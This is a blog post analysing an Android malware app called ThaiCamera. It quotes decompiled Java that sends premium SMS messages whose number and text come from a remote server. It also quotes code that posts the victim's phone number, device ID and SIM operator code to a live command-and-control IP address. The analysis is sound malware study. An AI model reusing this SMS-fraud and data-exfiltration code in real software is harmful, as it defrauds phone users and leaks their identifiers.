<!DOCTYPE html><html><head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  
  
  <title>  Android Malware RE- ThaiCamera |   Ikonw Blog </title>

 
  
    <link rel="icon" href="/images/avatar.jpg">
  


  
<link rel="stylesheet" href="/nayo.min.css">
 
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head>  
  <body>   
    
      <header class="header-wrapper">
  <nav class="inner">
    <div class="title">
      <a href="/">
        <img class="logo" src="/images/logo.png">
      </a>
    </div>

    <ul class="menu">
      <li class="item">
        <a class="link" id="menu-home" href="/"> <!-- Home -->
          <i class="iconfont icon-home"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
          <i class="iconfont icon-archives"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
          <i class="iconfont icon-tags"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-about" href="/about"> <!-- About -->
          <i class="iconfont icon-about"></i>
        </a>
      </li>
      <li class="item">
        <a class="link" id="menu-search"> <!-- Search -->
          <i class="iconfont icon-search"></i>
        </a>
      </li>
    </ul>
  </nav>
</header>


<header class="mobile-header-wrapper">
  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
</header>   

      <div class="container">       
          
          
            <div class="container-inner">  
          

          <article class="post slideDownMin">
  
	
<div class="header">
		<p class="title">	
			Android Malware RE- ThaiCamera
		</p>
		<div class="info">	
			<time>
				Feb 05, 2024
			</time>

			
			
				<i class="iconfont icon-words"></i>
				<span class="words">13589
				</span>
			
		</div>
</div> 
	

    <script type="text/x-mathjax-config">
        var post = document.getElementsByClassName("post")[0];  
        MathJax.Hub.Config({
            showProcessingMessages: false,
            messageStyle: "none",    
            tex2jax: {
                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
            },
            "HTML-CSS": {            
                showMathMenu: false
            }
        });
        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
    </script>
    <style>.MathJax{outline:0;}</style>

    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
 

	  <div class="typo post-content ">

		

			
					<h1 id="Purpose-1"><a href="#Purpose-1" class="headerlink" title="Purpose"></a>Purpose</h1><p>The target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity.</p>
<h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><p>Firstly, for effective Reverse engineering, we must not dive in and read the code line by lines. Since we are targeting if the application sends frud SMS, we should look for the Send SMS functions.</p>
<p>Have some research we found that, SmsManager is the standard API provided by Android for sending SMS messages, it allows to send text messages without user interaction.</p>
<p><a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/telephony/SmsManager">SMS Manager API</a></p>
<ul>
<li>sendTextMessage()</li>
<li>sendMultipartTextMessage()</li>
<li>SendDataMessage()</li>
</ul>
<p><img src="/images/Android%20Malware%20RE%20-%20ThaiCamera/image-20240205160634169.png"></p>
<p>The thing caught my eye is the URL in the <code>BootService</code></p>
<p>It listen for broadcast receiver, and if the action of is equal to <code>SENT_HUGE_SMS_ACTION</code> it will actually load a intent of <code>ACTION_START</code> and send the broadcast.</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"SENT_HUGE_SMS_ACTION"</span>.equals(action)) {</span><br><span class="line">            <span class="keyword">switch</span> (getResultCode()) {</span><br><span class="line">                <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">                    BootService.<span class="built_in">this</span>.sendmessageStatus(AppEventsConstants.EVENT_PARAM_VALUE_YES);</span><br><span class="line">                    <span class="type">Intent</span> <span class="variable">start_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Loading.ACTION_START);</span><br><span class="line">                    context.sendBroadcast(start_intent);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    BootService.<span class="built_in">this</span>.sendmessageStatus(AppEventsConstants.EVENT_PARAM_VALUE_NO);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    BootService.<span class="built_in">this</span>.sendmessageStatus(<span class="string">"2"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    BootService.<span class="built_in">this</span>.sendmessageStatus(<span class="string">"4"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    BootService.<span class="built_in">this</span>.sendmessageStatus(<span class="string">"5"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    BootService.<span class="built_in">this</span>.sendmessageStatus(<span class="string">"3"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>The above code also states about the <code>sendmessageStatus</code> appear in the same file.</p>
<p>It gets the phone particular and send along with the SMS status with POST request to <code>http://139.59.107.168:8088</code></p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> String <span class="title function_">getPhoneNumber</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">TelephonyManager</span> <span class="variable">mTelephonyMgr</span> <span class="operator">=</span> (TelephonyManager) getSystemService(<span class="string">"phone"</span>);</span><br><span class="line">        <span class="keyword">return</span> mTelephonyMgr.getLine1Number();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendmessageStatus</span><span class="params">(String status)</span> {</span><br><span class="line">        <span class="keyword">if</span> (TextUtils.isEmpty(<span class="built_in">this</span>.phone)) {</span><br><span class="line">            <span class="built_in">this</span>.phone = getPhoneNumber();</span><br><span class="line">        }</span><br><span class="line">        <span class="type">String</span> <span class="variable">device</span> <span class="operator">=</span> getDeviceId();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">"http://139.59.107.168:8088/smspostback?phone="</span> + <span class="built_in">this</span>.phone + <span class="string">"&amp;status="</span> + status + <span class="string">"&amp;diviceid="</span> + device;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(spec);</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">            urlConnection.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">            urlConnection.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line">            urlConnection.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">            urlConnection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">            urlConnection.setDoInput(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (urlConnection.getResponseCode() == <span class="number">200</span>) {</span><br><span class="line">                Log.e(GraphResponse.SUCCESS_KEY, GraphResponse.SUCCESS_KEY);</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                Log.e(<span class="string">"error"</span>, <span class="string">"error"</span>);</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getDeviceId</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">TelephonyManager</span> <span class="variable">TelephonyMgr</span> <span class="operator">=</span> (TelephonyManager) getSystemService(<span class="string">"phone"</span>);</span><br><span class="line">        <span class="keyword">return</span> TelephonyMgr.getDeviceId();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>The intent <code>"SENT_HUGE_SMS_ACTION</code> is very suspicious, we can have a search on the string.</p>
<p>It appear in the <code>.com.cp.camera.loading</code>.</p>
<p>The method name is called <code>sendMessage</code>.</p>
<p>It initialized a bundle object. </p>
<blockquote>
<p>Bundle is a key-value store for passing data between Android components.</p>
</blockquote>
<p>it then map the key <code>FirebaseAnalytics.Param.ITEM_NAME</code> to string <code>SEND_SMS</code></p>
<p>next it created a new Intent called <code>SENT_HUGE_SMS_ACTION</code> and put the bundle as a parameter into the intent.</p>
<p>Next it created a <code>smsManager</code> instance.</p>
<p><code>PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728);</code></p>
<p>This is a static method call to <code>PendingIntent.getBroadcast()</code> which returns a <code>PendingIntent</code> that will perform a broadcast.</p>
<p>The 4 parameter, <code>this</code> refer to the current context, <code>0</code> is a request code, its usually set to 0 because it’s not used for broadcast PendingIntent, the third paramter <code>itsend</code> is obviously the intent to be broadcast which the action is <code>SEND_HUGE_SMS_ACTION</code>. Lastly, the last parameter control how the methods behave, in this case, <code>134217728</code> corresponds to the flag <code>PendingIntent.FLAG_UPDATE_CURRENT</code> which update the existing <code>PendingIntent</code> if it already exists, otherwise creates a new one.</p>
<p><a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/app/PendingIntent#FLAG_UPDATE_CURRENT">FLAG_UPDATE_CURRENT</a></p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendMessage</span><span class="params">(String mobile, String content)</span> {</span><br><span class="line">    <span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">    bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, <span class="string">"SEND_SMS"</span>);</span><br><span class="line">    <span class="built_in">this</span>.mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle);</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">itSend</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">"SENT_HUGE_SMS_ACTION"</span>);</span><br><span class="line">    itSend.putExtras(bundle);</span><br><span class="line">    <span class="type">SmsManager</span> <span class="variable">sms</span> <span class="operator">=</span> SmsManager.getDefault();</span><br><span class="line">    <span class="type">PendingIntent</span> <span class="variable">sentintent</span> <span class="operator">=</span> PendingIntent.getBroadcast(<span class="built_in">this</span>, <span class="number">0</span>, itSend, <span class="number">134217728</span>);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">if</span> (content.length() &gt; <span class="number">70</span>) {</span><br><span class="line">            List&lt;String&gt; msgs = sms.divideMessage(content);</span><br><span class="line">            <span class="keyword">for</span> (String msg : msgs) {</span><br><span class="line">                sms.sendTextMessage(mobile, <span class="literal">null</span>, msg, sentintent, <span class="literal">null</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        sms.sendTextMessage(mobile, <span class="literal">null</span>, content, sentintent, <span class="literal">null</span>);</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">        <span class="type">SharedPreferences</span> <span class="variable">sharedPreferences</span> <span class="operator">=</span> getSharedPreferences(<span class="string">"videoLibrary"</span>, <span class="number">0</span>);</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sharedPreferences.edit();</span><br><span class="line">        editor.putString(<span class="string">"videoShare"</span>, AppEventsConstants.EVENT_PARAM_VALUE_NO);</span><br><span class="line">        editor.apply();</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>After that, I guess its checking the content length of the message, if the content length is more than 70, it actually call the method <code>sms.divideMessage</code> to divide the sms into multiple SMS. and Send one by one. The reason being SMS messages are limited to 70 character in UC-2 encoding.</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> {</span><br><span class="line">    <span class="keyword">if</span> (content.length() &gt; <span class="number">70</span>) {</span><br><span class="line">        List&lt;String&gt; msgs = sms.divideMessage(content);</span><br><span class="line">        <span class="keyword">for</span> (String msg : msgs) {</span><br><span class="line">            sms.sendTextMessage(mobile, <span class="literal">null</span>, msg, sentintent, <span class="literal">null</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    sms.sendTextMessage(mobile, <span class="literal">null</span>, content, sentintent, <span class="literal">null</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>This is my first time encounter the <code>sms.sendTextMessage</code></p>
<figure class="highlight arduino"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">sendTextMessage</span> <span class="params">(<span class="type">String</span> destinationAddress, </span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">String</span> scAddress, </span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="type">String</span> text, </span></span></span><br><span class="line"><span class="params"><span class="function">                PendingIntent sentIntent, </span></span></span><br><span class="line"><span class="params"><span class="function">                PendingIntent deliveryIntent)</span></span></span><br></pre></td></tr></tbody></table></figure>

<p><code>sms.sendTextMessage(mobile, null, msg, sentintent, null);</code></p>
<ul>
<li>destination Address - The address the message to; In this case is the mobile number</li>
<li>scAddress - the Service center address or null to use the current default SMSC</li>
<li>text - The body of the message</li>
<li>sentIntent - the intent to handle the result of sending the message, such as whether it was successfully sent or not .</li>
</ul>
<p>Good now we know what sendMessage do (Actually can tell by the name, but for the sake of study).</p>
<p>Next, we can look for which methods or class called this <code>sendMessage</code>.</p>
<p>It appear in the same file </p>
<p><img src="/images/Android%20Malware%20RE%20-%20ThaiCamera/image-20240205175759671.png"></p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> {</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &lt; <span class="number">23</span>) {</span><br><span class="line">        <span class="keyword">if</span> (Loading.<span class="built_in">this</span>.service != <span class="literal">null</span> &amp;&amp; Loading.<span class="built_in">this</span>.content != <span class="literal">null</span>) {</span><br><span class="line">            Loading.<span class="built_in">this</span>.sendMessage(Loading.<span class="built_in">this</span>.service, Loading.<span class="built_in">this</span>.content);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> <span class="variable">checkCallPhonePermission</span> <span class="operator">=</span> ContextCompat.checkSelfPermission(Loading.<span class="built_in">this</span>.getApplicationContext(), <span class="string">"android.permission.SEND_SMS"</span>);</span><br><span class="line">    <span class="keyword">if</span> (Loading.<span class="built_in">this</span>.videoShare.equals(AppEventsConstants.EVENT_PARAM_VALUE_YES) &amp;&amp; checkCallPhonePermission == <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span> (Loading.<span class="built_in">this</span>.service != <span class="literal">null</span> &amp;&amp; Loading.<span class="built_in">this</span>.content != <span class="literal">null</span>) {</span><br><span class="line">            Loading.<span class="built_in">this</span>.sendMessage(Loading.<span class="built_in">this</span>.service, Loading.<span class="built_in">this</span>.content);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>It firstly check if the version is less than 23, if less than 23, it will directly called the method <code>Loading.this.sendMessage(Loading.this.service, Loading.this.content);</code>.</p>
<p>According to what we have analysis just now, the first parameter is the number, second parameter is the message body.</p>
<p>The name seems funny, but its alright, will come back to this later, if the version is more than 23, it will check if the application have the permission of <code>"android.permission.SEND_SMS"</code></p>
<p><a target="_blank" rel="noopener" href="https://developer.android.com/training/permissions/requesting">Android runtime permission</a></p>
<p>The above link states that if the android SDK version is 23 (Android 6.0) and above it need to request for runtime permission.</p>
<p>Ok back to the topic, the code below will check if run time permission is granted, and send the message.</p>
<p>So now, what is <code>this.service</code> and <code>this.content</code>, this is our main focus, where the message is beings sent to and what is the content.</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> {</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_mainfir);</span><br><span class="line">    <span class="built_in">this</span>.ms_show = (TextView) findViewById(R.id.ms_show);</span><br><span class="line">    <span class="built_in">this</span>.mReceiver = <span class="keyword">new</span> <span class="title class_">StartActivityReceiver</span>();</span><br><span class="line">    registerReceiver(<span class="built_in">this</span>.mReceiver, <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(ACTION_START));</span><br><span class="line">    <span class="type">TelephonyManager</span> <span class="variable">telManager</span> <span class="operator">=</span> (TelephonyManager) getSystemService(<span class="string">"phone"</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">operator</span> <span class="operator">=</span> telManager.getSimOperator();</span><br><span class="line">    <span class="built_in">this</span>.button_sensms = (Button) findViewById(R.id.button_sensms);</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; <span class="number">9</span>) {</span><br><span class="line">        StrictMode.<span class="type">ThreadPolicy</span> <span class="variable">policy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StrictMode</span>.ThreadPolicy.Builder().permitAll().build();</span><br><span class="line">        StrictMode.setThreadPolicy(policy);</span><br><span class="line">    }</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">service_intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, BootService.class);</span><br><span class="line">    startService(service_intent);</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> loginByPost(operator);</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(jsonStr);</span><br><span class="line">        <span class="built_in">this</span>.content = object.getString(<span class="string">"content"</span>);</span><br><span class="line">        <span class="built_in">this</span>.rule = object.getString(<span class="string">"rule"</span>);</span><br><span class="line">        <span class="built_in">this</span>.service = object.getString(<span class="string">"service"</span>);</span><br><span class="line">        <span class="built_in">this</span>.status = object.getString(<span class="string">"code"</span>);</span><br><span class="line">        <span class="built_in">this</span>.button = object.getString(<span class="string">"button"</span>);</span><br><span class="line">        <span class="built_in">this</span>.IMEIS = object.getString(<span class="string">"imei"</span>);</span><br><span class="line">        <span class="built_in">this</span>.imeicontent = object.getString(<span class="string">"imeicontent"</span>);</span><br><span class="line">    } <span class="keyword">catch</span> (JSONException e) {</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.rule != <span class="literal">null</span>) {</span><br><span class="line">        <span class="built_in">this</span>.ms_show.setText(<span class="built_in">this</span>.rule);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.button != <span class="literal">null</span>) {</span><br><span class="line">        <span class="built_in">this</span>.button_sensms.setText(<span class="built_in">this</span>.button);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (operator != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.imeicontent != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.imeicontent.equals(<span class="string">""</span>)) {</span><br><span class="line">        String[] imeicontents = <span class="built_in">this</span>.imeicontent.split(<span class="string">","</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) {</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= imeicontents.length) {</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            String[] imei = imeicontents[i].split(<span class="string">":"</span>);</span><br><span class="line">            <span class="keyword">if</span> (!operator.equals(imei[<span class="number">0</span>])) {</span><br><span class="line">                i++;</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="built_in">this</span>.shareSend = <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">this</span>.service = imei[<span class="number">1</span>];</span><br><span class="line">                <span class="built_in">this</span>.content = imei[<span class="number">2</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>Above file is written onCreate method in the same file.</p>
<p><code>this.service = object.getString("service");</code></p>
<p>We can see that <code>this.service</code> is get through the object.</p>
<p><code>JSONObject object = new JSONObject(jsonStr);</code></p>
<p>The object is a JSON object by <code>jsonStr</code></p>
<p><code>String jsonStr = loginByPost(operator);</code></p>
<p>The jsonStr comes from the function <code>loginByPost</code> with parameter <code>operator</code>.</p>
<p><code>String operator = telManager.getSimOperator();</code></p>
<p>The operator is the value of <code>telManager.getSimOperator()</code></p>
<p>Very interesting, this <code>getSimOpertor</code> retrieves the MCC+MNC(Mobile Country Code + Mobile NetWork Code) of the active SIM card as a string.</p>
<p>Let’s have a example for Singapore, the MMC (Mobile Country Code) is <code>525</code>, the MNC (Mobile Network Code) depends on the mobile network operator.</p>
<ul>
<li>Singtel MNC - 01</li>
<li>StarHub MNC - 05</li>
<li>M1 MNC - 03</li>
</ul>
<p>So if we are using Singtel SIMCard, the value return will be <code>52501</code></p>
<p>Cool!</p>
<p>Let’s examine the <code>loginByPost</code> method.</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">loginByPost</span><span class="params">(String code)</span> {</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Build.VERSION.RELEASE;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Build.MODEL;</span><br><span class="line">    getPhoneNumber();</span><br><span class="line">    getDeviceId();</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">"http://139.59.107.168:8088/appsharejson?code="</span> + code;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(spec);</span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">        urlConnection.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">        urlConnection.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line">        urlConnection.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">        urlConnection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">        urlConnection.setDoInput(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (urlConnection.getResponseCode() == <span class="number">200</span>) {</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> urlConnection.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) {</span><br><span class="line">                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> is.read(buffer);</span><br><span class="line">                <span class="keyword">if</span> (len != -<span class="number">1</span>) {</span><br><span class="line">                    baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    is.close();</span><br><span class="line">                    baos.close();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray());</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>It sends the MMC+MNC string to the target server with a POST request</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">"http://139.59.107.168:8088/appsharejson?code="</span> + code;</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(spec);</span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">urlConnection.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">urlConnection.setReadTimeout(<span class="number">5000</span>);</span><br><span class="line">urlConnection.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">urlConnection.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">urlConnection.setDoInput(<span class="literal">true</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>Next, it check if the request status code is 200, then it read the response content into buffer and return it as a string. </p>
<p>So we can safely conclude that the the the user’s MNC+MMC is being sent to the target server, then the target server returns a json contains the follow values:</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.content = object.getString(<span class="string">"content"</span>);</span><br><span class="line"><span class="built_in">this</span>.rule = object.getString(<span class="string">"rule"</span>);</span><br><span class="line"><span class="built_in">this</span>.service = object.getString(<span class="string">"service"</span>);</span><br><span class="line"><span class="built_in">this</span>.status = object.getString(<span class="string">"code"</span>);</span><br><span class="line"><span class="built_in">this</span>.button = object.getString(<span class="string">"button"</span>);</span><br><span class="line"><span class="built_in">this</span>.IMEIS = object.getString(<span class="string">"imei"</span>);</span><br><span class="line"><span class="built_in">this</span>.imeicontent = object.getString(<span class="string">"imeicontent"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>Now, let’s determine how the Send SMS frud is being triggered, we can search by the usage of the <code>sendMessage</code> method</p>
<p><img src="/images/Android%20Malware%20RE%20-%20ThaiCamera/image-20240205230239633.png"></p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onRequestPermissionsResult</span><span class="params">(<span class="type">int</span> requestCode, String[] permissions, <span class="type">int</span>[] grantResults)</span> {</span><br><span class="line">    <span class="built_in">super</span>.onRequestPermissionsResult(requestCode, permissions, grantResults);</span><br><span class="line">    <span class="keyword">if</span> (requestCode == <span class="number">1</span> &amp;&amp; grantResults[<span class="number">0</span>] == <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.service != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.content != <span class="literal">null</span>) {</span><br><span class="line">            sendMessage(<span class="built_in">this</span>.service, <span class="built_in">this</span>.content);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    Toast.makeText(<span class="built_in">this</span>, <span class="string">"Please allow access！"</span>, <span class="number">1</span>).show();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>This piece of code is previously we are talking about the requesting the runtime permission, it requests for the runtime permission, as long as it gets the permission, it will actually call the <code>sendMessage</code> method.</p>
